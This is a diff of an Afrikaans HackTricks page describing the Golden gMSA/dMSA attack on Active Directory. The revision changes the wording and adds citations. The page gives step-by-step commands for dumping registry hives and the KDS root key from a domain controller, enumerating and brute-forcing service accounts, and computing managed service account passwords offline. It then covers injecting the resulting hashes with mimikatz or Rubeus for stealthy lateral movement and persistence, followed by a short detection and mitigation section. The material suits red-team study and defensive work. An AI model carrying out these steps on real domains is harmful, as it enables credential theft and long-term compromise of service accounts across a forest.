@@ -1,43 +1,43 @@
-# Golden gMSA/dMSA Aanval (Offline Afleiding van Gemanagte Diensrekening Wagwoorde)
+# Golden gMSA/dMSA Attack (Offline Derivation of Managed Service Account Passwords)
 
 {{#include ../../banners/hacktricks-training.md}}
 
 ## Oorsig
 
-Windows Gemanagte Diensrekeninge (MSA) is spesiale prinsipes wat ontwerp is om dienste te laat loop sonder die behoefte om hul wagwoorde handmatig te bestuur.
-Daar is twee hoof variasies:
+Windows Managed Service Accounts (MSA) is spesiale principals wat ontwerp is om dienste te laat loop sonder dat hul wagwoorde handmatig bestuur hoef te word.
+Daar is twee hoofvariante:
 
-1. **gMSA** – groep Gemanagte Diensrekening – kan op verskeie gasheer gebruik word wat gemagtig is in sy `msDS-GroupMSAMembership` attribuut.
-2. **dMSA** – gedelegeerde Gemanagte Diensrekening – die (voorskou) opvolger van gMSA, wat op dieselfde kriptografie staatmaak maar meer granular gedelegeerde scenario's toelaat.
+1. **gMSA** – group Managed Service Account – kan op verskeie hosts gebruik word wat in sy `msDS-GroupMSAMembership`-attribute gemagtig is.
+2. **dMSA** – delegated Managed Service Account – die (preview) opvolger van gMSA, wat op dieselfde kriptografie staatmaak maar meer fynkorrelige delegation-scenario's moontlik maak.
 
-Vir beide variasies is die **wagwoord nie gestoor** op elke Domeinbeheerder (DC) soos 'n gewone NT-hash nie. In plaas daarvan kan elke DC die huidige wagwoord **aflei** ter plaatse van:
+Vir beide variante word die **wagwoord nie** op elke Domain Controller (DC) soos 'n gewone NT-hash gestoor nie. In plaas daarvan kan elke DC die huidige wagwoord on-the-fly deriveer uit:
 
-* Die woud-wye **KDS Wortelsleutel** (`KRBTGT\KDS`) – ewekansig gegenereerde GUID-genaamde geheim, wat na elke DC gerepliceer word onder die `CN=Master Root Keys,CN=Group Key Distribution Service, CN=Services, CN=Configuration, …` houer.
-* Die teikenrekening **SID**.
-* 'n per-rekening **ManagedPasswordID** (GUID) wat in die `msDS-ManagedPasswordId` attribuut gevind word.
+* Die forest-wye **KDS Root Key** (`KRBTGT\KDS`)  – 'n lukraak gegenereerde GUID-genaamde secret, gerepliseer na elke DC onder die `CN=Master Root Keys,CN=Group Key Distribution Service, CN=Services, CN=Configuration, …`-container.
+* Die target account se **SID**.
+* 'n Per-account **ManagedPasswordID** (GUID) wat in die `msDS-ManagedPasswordId`-attribute gevind word.
 
-Die afleiding is: `AES256_HMAC( KDSRootKey , SID || ManagedPasswordID )` → 240 byte blob wat uiteindelik **base64-gecodeer** en in die `msDS-ManagedPassword` attribuut gestoor word.
-Geen Kerberos-verkeer of domeininteraksie is nodig tydens normale wagwoordgebruik nie – 'n lidgasheer lei die wagwoord plaaslik af solank dit die drie insette ken.
+Die derivation is: `AES256_HMAC( KDSRootKey , SID || ManagedPasswordID )` → 240 byte blob wat uiteindelik **base64-encoded** word en in die `msDS-ManagedPassword`-attribute gestoor word.
+Geen Kerberos-verkeer of domain interaction word tydens normale wagwoordgebruik vereis nie – 'n member host deriveer die wagwoord plaaslik solank dit die drie inputs ken.
 
-## Golden gMSA / Golden dMSA Aanval
+## Golden gMSA / Golden dMSA Attack
 
-As 'n aanvaller al drie insette **aflyn** kan verkry, kan hulle **geldige huidige en toekomstige wagwoorde** vir **enige gMSA/dMSA in die woud** bereken sonder om die DC weer aan te raak, wat die volgende omseil:
+As 'n attacker al drie inputs **offline** kan bekom, kan hulle **geldige huidige en toekomstige wagwoorde** vir **enige gMSA/dMSA in die forest** bereken sonder om weer met die DC te kommunikeer, en die volgende omseil:<sup>[[1]](#references)[[2]](#references)</sup>
 
-* LDAP lees ouditering
-* Wagwoord verandering intervalle (hulle kan vooraf bereken)
+* LDAP read auditing
+* Wagwoord-change intervals (hulle kan dit vooraf bereken)
 
-Dit is analoog aan 'n *Golden Ticket* vir diensrekeninge.
+Dit is soortgelyk aan 'n *Golden Ticket* vir service accounts.<sup>[[1]](#references)[[2]](#references)</sup>
 
-### Voorvereistes
+### Vereistes
 
-1. **Woud-vlak kompromie** van **een DC** (of Enterprise Admin), of `SYSTEM` toegang tot een van die DC's in die woud.
-2. Vermoë om diensrekeninge te lys (LDAP lees / RID brute-force).
-3. .NET ≥ 4.7.2 x64 werkstasie om [`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) of ekwivalente kode te loop.
+1. **Forest-level compromise** van **een DC** (of Enterprise Admin), of `SYSTEM`-toegang tot een van die DC's in die forest.
+2. Die vermoë om service accounts te enumerate (LDAP read / RID brute-force).
+3. .NET ≥ 4.7.2 x64 workstation om [`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) of ekwivalente code uit te voer.
 
 ### Golden gMSA / dMSA
-##### Fase 1 – Trek die KDS Wortelsleutel uit
+#### Phase 1 – Extract the KDS Root Key
 
-Dump van enige DC (Volume Shadow Copy / rou SAM+SECURITY hives of afstandsgeheime):
+Dump vanaf enige DC (Volume Shadow Copy / raw SAM+SECURITY hives of remote secrets):<sup>[[1]](#references)[[2]](#references)</sup>
 ```cmd
 reg save HKLM\SECURITY security.hive
 reg save HKLM\SYSTEM  system.hive
@@ -53,69 +53,69 @@ GoldendMSA.exe kds
 # With GoldenGMSA
 GoldenGMSA.exe kdsinfo
 ```
-Die base64-string gemerk `RootKey` (GUID naam) is benodig in latere stappe.
+Die base64-string gemerk `RootKey` (GUID-naam) word in latere stappe benodig.<sup>[[1]](#references)[[2]](#references)</sup>
 
-##### Fase 2 – Enumereer gMSA / dMSA objekten
+##### Fase 2 – Enumerateer gMSA / dMSA-objekte
 
-Herwin ten minste `sAMAccountName`, `objectSid` en `msDS-ManagedPasswordId`:
-```powershell
+Haal ten minste `sAMAccountName`, `objectSid` en `msDS-ManagedPasswordId` op:<sup>[[1]](#references)[[2]](#references)</sup>
+```bash
 # Authenticated or anonymous depending on ACLs
 Get-ADServiceAccount -Filter * -Properties msDS-ManagedPasswordId | \
 Select sAMAccountName,objectSid,msDS-ManagedPasswordId
 
 GoldenGMSA.exe gmsainfo
 ```
-[`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) implementeer helper-modusse:
-```powershell
+[`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) implementeer helper modes:<sup>[[1]](#references)</sup>
+```bash
 # LDAP enumeration (kerberos / simple bind)
 GoldendMSA.exe info -d example.local -m ldap
 
 # RID brute force if anonymous binds are blocked
 GoldendMSA.exe info -d example.local -m brute -r 5000 -u jdoe -p P@ssw0rd
 ```
-##### Fase 3 – Raai / Ontdek die ManagedPasswordID (wanneer dit ontbreek)
+##### Fase 3 – Guess / Discover die ManagedPasswordID (wanneer dit ontbreek)
 
-Sommige implementasies *verwyder* `msDS-ManagedPasswordId` van ACL-beskermde lees. Omdat die GUID 128-bis is, is naïewe bruteforce onmoontlik, maar:
+Sommige deployments *strip* `msDS-ManagedPasswordId` uit ACL-beskermde reads.
+Omdat die GUID 128-bis is, is naïewe bruteforce onuitvoerbaar, maar:
 
-1. Die eerste **32 bits = Unix epocht tyd** van die rekening se skepping (minute resolusie).
-2. Gevolg deur 96 ewekansige bits.
+1. Die eerste **32 bisse = Unix epoch time** van die skepping van die account (minute-resolusie).
+2. Gevolg deur 96 random bisse.
 
-Daarom is 'n **smal woordlys per rekening** (± paar uur) realisties.
-```powershell
+Daarom is ’n **nou wordlist per account** (± ’n paar uur) realisties.
+```bash
 GoldendMSA.exe wordlist -s <SID> -d example.local -f example.local -k <KDSKeyGUID>
 ```
-Die hulpmiddel bereken kandidaat wagwoorde en vergelyk hul base64 blob teen die werklike `msDS-ManagedPassword` attribuut – die ooreenkoms onthul die korrekte GUID.
+Die hulpmiddel bereken kandidaatwagwoorde en vergelyk hul base64-blob met die werklike `msDS-ManagedPassword`-attribuut – die passing onthul die korrekte GUID.
 
-##### Fase 4 – Aflyn Wagwoord Berekening & Omskakeling
+##### Fase 4 – Offline Wagwoordberekening en -omskakeling
 
-Sodra die ManagedPasswordID bekend is, is die geldige wagwoord een opdrag weg:
-```powershell
+Sodra die ManagedPasswordID bekend is, is die geldige wagwoord slegs een command weg:<sup>[[1]](#references)[[2]](#references)</sup>
+```bash
 # derive base64 password
 GoldendMSA.exe compute -s <SID> -k <KDSRootKey> -d example.local -m <ManagedPasswordID> -i <KDSRootKey ID>
 GoldenGMSA.exe compute --sid <SID> --kdskey <KDSRootKey> --pwdid <ManagedPasswordID>
 ```
-Die resulterende hashes kan ingespuit word met **mimikatz** (`sekurlsa::pth`) of **Rubeus** vir Kerberos misbruik, wat stealth **laterale beweging** en **volharding** moontlik maak.
+Die gevolglike hashes kan met **mimikatz** (`sekurlsa::pth`) of **Rubeus** ingespuit word vir Kerberos-abuse, wat stealth **lateral movement** en **persistence** moontlik maak.
 
-## Opsporing & Versagting
+## Opsporing en versagting
 
-* Beperk **DC rugsteun en registrasie heuning lees** vermoëns tot Tier-0 administrateurs.
-* Monitor **Directory Services Restore Mode (DSRM)** of **Volume Shadow Copy** skepping op DC's.
-* Ouudit lees / veranderinge aan `CN=Master Root Keys,…` en `userAccountControl` vlae van diens rekeninge.
-* Ontdek ongewone **base64 wagwoord skrywe** of skielike diens wagwoord hergebruik oor gasheer.
-* Oorweeg om hoë-privilege gMSA's na **klassieke diens rekeninge** te omskep met gereelde ewekansige rotasies waar Tier-0 isolasie nie moontlik is nie.
+* Beperk **DC backup and registry hive read**-vermoëns tot Tier-0-administrateurs.
+* Monitor **Directory Services Restore Mode (DSRM)**- of **Volume Shadow Copy**-skepping op DCs.
+* Oudit leesbewerkings / veranderinge aan `CN=Master Root Keys,…` en `userAccountControl`-vlae van diensrekeninge.
+* Bespeur ongewone **base64 password writes** of skielike hergebruik van dienswagwoorde oor hosts heen.
+* Oorweeg dit om hoëvoorreg-gMSAs na **classic service accounts** met gereelde, ewekansige rotasies om te skakel waar Tier-0-isolasie nie moontlik is nie.
 
 ## Gereedskap
 
-* [`Semperis/GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) – verwysingsimplementering gebruik in hierdie bladsy.
-* [`Semperis/GoldenGMSA`](https://github.com/Semperis/GoldenGMSA/) – verwysingsimplementering gebruik in hierdie bladsy.
+* [`Semperis/GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) – verwysingsimplementering wat op hierdie bladsy gebruik word.<sup>[[3]](#references)</sup>
+* [`Semperis/GoldenGMSA`](https://github.com/Semperis/GoldenGMSA/) – verwysingsimplementering wat op hierdie bladsy gebruik word.
 * [`mimikatz`](https://github.com/gentilkiwi/mimikatz) – `lsadump::secrets`, `sekurlsa::pth`, `kerberos::ptt`.
-* [`Rubeus`](https://github.com/GhostPack/Rubeus) – pass-the-ticket met afgeleide AES sleutels.
+* [`Rubeus`](https://github.com/GhostPack/Rubeus) – pass-the-ticket met behulp van afgeleide AES-sleutels.
 
 ## Verwysings
 
-- [Golden dMSA – outentikasie omseiling vir gedelegeerde Beheerde Diens Rekeninge](https://www.semperis.com/blog/golden-dmsa-what-is-dmsa-authentication-bypass/)
-- [gMSA Aktiewe Gids Aanval Rekeninge](https://www.semperis.com/blog/golden-gmsa-attack/)
-- [Semperis/GoldenDMSA GitHub-bewaarplek](https://github.com/Semperis/GoldenDMSA)
-- [Improsec – Golden gMSA vertrou aanval](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent)
+- [1] [Golden dMSA – authentication bypass for delegated Managed Service Accounts](https://www.semperis.com/blog/golden-dmsa-what-is-dmsa-authentication-bypass/)
+- [2] [gMSA Active Directory Attacks Accounts](https://www.semperis.com/blog/golden-gmsa-attack/)
+- [3] [Semperis/GoldenDMSA GitHub repository](https://github.com/Semperis/GoldenDMSA)
 
 {{#include ../../banners/hacktricks-training.md}}
